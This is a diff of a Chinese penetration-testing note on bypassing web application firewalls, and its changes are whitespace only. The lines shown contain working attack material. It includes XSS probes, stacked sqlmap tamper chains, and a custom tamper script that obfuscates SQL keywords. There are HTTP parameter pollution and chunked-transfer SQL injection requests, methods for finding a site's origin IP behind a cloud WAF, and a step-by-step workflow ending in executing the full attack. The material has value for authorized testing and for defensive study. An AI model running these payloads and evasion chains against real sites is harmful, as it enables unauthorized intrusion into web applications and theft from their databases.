@@ -2,22 +2,22 @@
 
 ## 目录
 - [[#一、WAF检测与识别|一、WAF检测与识别]]
-  - [[#1.1 WAF工作原理|1.1 WAF工作原理]]
-  - [[#1.2 wafw00f与手工检测|1.2 wafw00f与手工检测]]
+ - [[#1.1 WAF工作原理|1.1 WAF工作原理]]
+ - [[#1.2 wafw00f与手工检测|1.2 wafw00f与手工检测]]
 - [[#二、sqlmap Tamper脚本深度解析|二、sqlmap Tamper脚本深度解析]]
-  - [[#2.1 Tamper分类详解|2.1 Tamper分类详解]]
-  - [[#2.2 Tamper组合策略|2.2 Tamper组合策略]]
-  - [[#2.3 自定义Tamper脚本|2.3 自定义Tamper脚本]]
+ - [[#2.1 Tamper分类详解|2.1 Tamper分类详解]]
+ - [[#2.2 Tamper组合策略|2.2 Tamper组合策略]]
+ - [[#2.3 自定义Tamper脚本|2.3 自定义Tamper脚本]]
 - [[#三、HTTP参数污染（HPP）|三、HTTP参数污染（HPP）]]
 - [[#四、编码绕过技术|四、编码绕过技术]]
-  - [[#4.1 URL与Unicode编码|4.1 URL与Unicode编码]]
-  - [[#4.2 十六进制与Base64编码|4.2 十六进制与Base64编码]]
-  - [[#4.3 HTML实体编码|4.3 HTML实体编码]]
+ - [[#4.1 URL与Unicode编码|4.1 URL与Unicode编码]]
+ - [[#4.2 十六进制与Base64编码|4.2 十六进制与Base64编码]]
+ - [[#4.3 HTML实体编码|4.3 HTML实体编码]]
 - [[#五、分段传输绕过|五、分段传输绕过]]
 - [[#六、协议层绕过|六、协议层绕过]]
-  - [[#6.1 HTTP方法与版本切换|6.1 HTTP方法与版本切换]]
-  - [[#6.2 Content-Type操纵与Host头绕过|6.2 Content-Type操纵与Host头绕过]]
-  - [[#6.3 IP绕过：寻找真实源站|6.3 IP绕过：寻找真实源站]]
+ - [[#6.1 HTTP方法与版本切换|6.1 HTTP方法与版本切换]]
+ - [[#6.2 Content-Type操纵与Host头绕过|6.2 Content-Type操纵与Host头绕过]]
+ - [[#6.3 IP绕过：寻找真实源站|6.3 IP绕过：寻找真实源站]]
 - [[#七、云WAF特殊绕过|七、云WAF特殊绕过]]
 - [[#八、流量混淆与OPSEC|八、流量混淆与OPSEC]]
 - [[#九、WAF绕过实战演练|九、WAF绕过实战演练]]
@@ -33,13 +33,13 @@ WAF（Web Application Firewall）位于客户端和Web服务器之间，分析HT
 
 ```mermaid
 flowchart TD
-    C[客户端] -->|正常请求| WAF[WAF防火墙]
-    C -->|恶意请求| WAF
-    WAF -->|L1: 协议合规检查| L2[L2: 签名匹配]
-    L2 -->|L3: 规则引擎| L3[L4: 行为分析]
-    L3 -->|L5: AI检测| PASS{放行?}
-    PASS -->|通过| S[Web服务器]
-    PASS -->|拦截| BLOCK[返回403/406/Blocked]
+ C[客户端] -->|正常请求| WAF[WAF防火墙]
+ C -->|恶意请求| WAF
+ WAF -->|L1: 协议合规检查| L2[L2: 签名匹配]
+ L2 -->|L3: 规则引擎| L3[L4: 行为分析]
+ L3 -->|L5: AI检测| PASS{放行?}
+ PASS -->|通过| S[Web服务器]
+ PASS -->|拦截| BLOCK[返回403/406/Blocked]
 ```
 
 **WAF部署模式：**
@@ -85,8 +85,8 @@ curl -I http://example.com
 
 **方法3: 大小写变化检测**
 ```html
-<script>alert(1)</script>  → 可能被拦截
-<ScRiPt>alert(1)</ScRiPt>  → 如果也拦截，WAF规则不够精确
+<script>alert(1)</script> → 可能被拦截
+<ScRiPt>alert(1)</ScRiPt> → 如果也拦截，WAF规则不够精确
 ```
 
 **方法4: HTTP版本差异测试**
@@ -163,7 +163,7 @@ sqlmap --list-tampers
 |--------|------|
 | `xforwardedfor.py` | 伪造X-Forwarded-For规避IP频率限制 |
 | `nonrecursivereplacement.py` | UNION → UNIUNIONON（非递归替换绕过） |
-| `multiplespaces.py` | UNION   SELECT（多个空格） |
+| `multiplespaces.py` | UNION SELECT（多个空格） |
 | `luanginx.py` | UNION → UNIOUNIONN（特定nginx+lua） |
 
 ### 2.2 Tamper组合策略
@@ -177,11 +177,11 @@ sqlmap -u "URL" --tamper=space2comment,randomcase,versionedkeywords
 
 # 深度绕过（企业级WAF）
 sqlmap -u "URL" \
-       --tamper="space2comment,randomcase,charencode,versionedkeywords,equaltolike"
+ --tamper="space2comment,randomcase,charencode,versionedkeywords,equaltolike"
 
 # 极限绕过（多层防护）
 sqlmap -u "URL" \
-       --tamper="apostrophemask,chardoubleencode,equaltolike,greatest,\
+ --tamper="apostrophemask,chardoubleencode,equaltolike,greatest,\
 multiplespaces,nonrecursivereplacement,randomcase,space2comment,\
 space2randomblank,versionedkeywords"
 ```
@@ -207,18 +207,18 @@ from lib.core.enums import PRIORITY
 __priority__ = PRIORITY.NORMAL
 
 def dependencies():
-    pass
+ pass
 
 def tamper(payload, **kwargs):
-    """
-    自定义绕过: 将SQL关键字用注释包裹 + 随机大小写
-    """
-    if payload:
-        payload = payload.replace("AND", "AnD")
-        payload = payload.replace("OR", "oR")
-        payload = payload.replace("SELECT", "SEL/**/ECT")
-        payload = payload.replace("UNION", "UN/**/ION")
-    return payload
+ """
+ 自定义绕过: 将SQL关键字用注释包裹 + 随机大小写
+ """
+ if payload:
+ payload = payload.replace("AND", "AnD")
+ payload = payload.replace("OR", "oR")
+ payload = payload.replace("SELECT", "SEL/**/ECT")
+ payload = payload.replace("UNION", "UN/**/ION")
+ return payload
 ```
 
 ```bash
@@ -241,12 +241,12 @@ HTTP参数污染通过发送多个同名参数来绕过WAF或改变应用程序�
 
 ```mermaid
 flowchart TD
-    REQ["?id=1&id=1' UNION SELECT..."] --> WAF[WAF检查第一个id=1]
-    WAF -->|放行| APP[应用解析]
-    APP --> PHP{后端平台}
-    PHP -->|PHP/Apache| LAST[取最后一个值 → 注入执行]
-    PHP -->|ASP.NET/IIS| MERGE[合并为id=1,1' UNION...]
-    PHP -->|JSP/Tomcat| FIRST[取第一个值]
+ REQ["?id=1&id=1' UNION SELECT..."] --> WAF[WAF检查第一个id=1]
+ WAF -->|放行| APP[应用解析]
+ APP --> PHP{后端平台}
+ PHP -->|PHP/Apache| LAST[取最后一个值 → 注入执行]
+ PHP -->|ASP.NET/IIS| MERGE[合并为id=1,1' UNION...]
+ PHP -->|JSP/Tomcat| FIRST[取第一个值]
 ```
 
 不同平台解析行为：PHP/Apache取最后 → `id=2`；ASP.NET/IIS合并 → `id=1,2`；JSP/Tomcat取第一；Flask取第一；Express转数组。
@@ -288,7 +288,7 @@ flowchart TD
 
 # Unicode UTF-8宽字节
 原始: ' (单引号)
-宽字节: %EF%BC%87  (MySQL GBK场景)
+宽字节: %EF%BC%87 (MySQL GBK场景)
 
 # UTF-16
 原始: <script>
@@ -351,8 +351,8 @@ WAF可能不支持chunked解析导致绕过，或重组所有chunk（需结合�
 **curl测试分块传输：**
 ```bash
 curl -X POST http://target.com/vuln.php \
-     -H "Transfer-Encoding: chunked" \
-     -d "id=test' OR '1'='1"
+ -H "Transfer-Encoding: chunked" \
+ -d "id=test' OR '1'='1"
 ```
 
 **HTTP请求走私（Request Smuggling）：**
@@ -416,8 +416,8 @@ Host: 127.0.0.1
 
 **方法1: DNS历史记录**
 ```
-https://securitytrails.com/  → 历史DNS A记录
-https://dnsdumpster.com/     → DNS枚举
+https://securitytrails.com/ → 历史DNS A记录
+https://dnsdumpster.com/ → DNS枚举
 ```
 
 **方法2: SSL证书查询**
@@ -505,16 +505,16 @@ nikto -h URL -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)..."
 
 ```mermaid
 flowchart TD
-    D[WAF检测: wafw00f] --> B[发送基本payload确认WAF拦截]
-    B --> T1[测试空格绕过: /**/]
-    T1 --> T2[测试大小写: oR/AnD]
-    T2 --> T3[测试URL编码: %27%20OR]
-    T3 --> T4[测试HPP: 参数污染]
-    T4 --> T5[测试Content-Type篡改]
-    T5 --> S[选择有效技术 → sqlmap tamper测试]
-    S --> BURP[Burp观察分析成功payload特征]
-    BURP --> COMBO[确定最佳tamper组合]
-    COMBO --> EXEC[执行完整攻击]
+ D[WAF检测: wafw00f] --> B[发送基本payload确认WAF拦截]
+ B --> T1[测试空格绕过: /**/]
+ T1 --> T2[测试大小写: oR/AnD]
+ T2 --> T3[测试URL编码: %27%20OR]
+ T3 --> T4[测试HPP: 参数污染]
+ T4 --> T5[测试Content-Type篡改]
+ T5 --> S[选择有效技术 → sqlmap tamper测试]
+ S --> BURP[Burp观察分析成功payload特征]
+ BURP --> COMBO[确定最佳tamper组合]
+ COMBO --> EXEC[执行完整攻击]
 ```
 
 **实战步骤：**
@@ -542,9 +542,9 @@ curl "http://target.com/?id=1&id=1' OR '1'='1"
 
 # Step 7: sqlmap + tamper测试
 sqlmap -u "http://target.com/?id=1" \
-       --tamper=space2comment,randomcase \
-       --proxy="http://127.0.0.1:8080" \
-       --delay=2 --random-agent
+ --tamper=space2comment,randomcase \
+ --proxy="http://127.0.0.1:8080" \
+ --delay=2 --random-agent
 
 # Step 8: Burp观察分析
 # 在Burp HTTP History中:
